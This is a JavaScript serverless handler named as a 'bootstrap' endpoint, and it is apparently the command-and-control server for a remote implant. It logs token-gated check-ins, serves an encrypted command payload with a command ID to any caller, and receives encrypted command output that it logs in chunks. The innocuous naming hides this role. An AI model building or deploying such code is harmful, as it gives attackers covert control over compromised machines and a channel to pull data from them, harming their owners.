import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '20';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');

  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }

  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }

  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) {
      console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    }
    return response.status(204).end();
  }

  return response.status(404).send('Not found');
}
